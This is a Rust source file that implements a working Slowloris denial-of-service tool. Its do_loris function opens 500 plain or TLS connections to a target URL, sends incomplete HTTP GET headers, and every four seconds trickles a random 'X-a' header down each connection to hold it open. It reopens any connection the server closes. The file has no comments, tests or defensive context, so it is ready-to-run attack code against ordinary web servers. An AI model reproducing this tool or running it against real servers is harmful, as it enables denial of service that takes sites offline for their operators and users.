extern crate native_tls;
extern crate url;
extern crate rand;
use url::Url;

use native_tls::{TlsConnector, TlsStream};
use std::io::{self, Read, Write};
use std::net::TcpStream;
use std::time::Duration;
use std::thread;

enum Stream<S>
where
    S: Read + Write,
{
    Tls(TlsStream<S>),
    Plain(S),
}

impl<S> Read for Stream<S>
where
    S: Read + Write,
{
    fn read(&mut self, buf: &mut [u8]) -> io::Result<usize> {
        match self {
            &mut Stream::Tls(ref mut stream) => stream.read(buf),
            &mut Stream::Plain(ref mut stream) => stream.read(buf),
        }
    }
}

impl<S> Write for Stream<S>
where
    S: Read + Write,
{
    fn write(&mut self, buf: &[u8]) -> io::Result<usize> {
        match self {
            &mut Stream::Tls(ref mut stream) => stream.write(buf),
            &mut Stream::Plain(ref mut stream) => stream.write(buf),
        }
    }

    fn flush(&mut self) -> io::Result<()> {
        match self {
            &mut Stream::Tls(ref mut stream) => stream.flush(),
            &mut Stream::Plain(ref mut stream) => stream.flush(),
        }
    }
}

pub fn do_loris(url: &str) {
    let url = Url::parse(url).unwrap();

    let connection_num = 500;
    let mut connections: Vec<_> = (0..connection_num)
        .map(|_| spawn_connection(&url))
        .collect();

    let timeout = 4000;
    loop {
        println!("start");
        for connection in &mut connections {
            let loris_header = get_loris_header();
            let res = connection.write_all(&loris_header);
            if res.is_err() {
                println!("Connection closed!");
                let mut new_connection = spawn_connection(&url);
                std::mem::swap(connection, &mut new_connection);
            } else {
                println!("Sleeping! zZzZzZ");
            }
        }
        thread::sleep(Duration::from_millis(timeout));
    }
}


fn get_stream(url: &Url) -> Stream<TcpStream> {
    let domain = url.host_str().unwrap();
    let port = url.port_or_known_default().unwrap();
    let stream = TcpStream::connect((domain, port)).unwrap();
    if url.scheme() == "https" {
        let connector = TlsConnector::builder().unwrap().build().unwrap();
        Stream::Tls(connector.connect(domain, stream).unwrap())
    } else {
        Stream::Plain(stream)
    }
}

fn spawn_connection(url: &Url) -> Stream<TcpStream> {
    let mut stream = get_stream(&url);
    let init_header = get_init_header(&url);
    stream.write_all(&init_header).unwrap();
    stream
}

fn get_init_header(url: &Url) -> Vec<u8> {
    format!(
        "GET {} HTTP/1.1\r\n\
         Host: {}\r\n",
        url.path(),
        url.host_str().unwrap()
    ).as_bytes()
        .to_vec()
}

fn get_loris_header() -> Vec<u8> {
    format!("X-a: {}\r\n", rand::random::<u32>(),)
        .as_bytes()
        .to_vec()
}
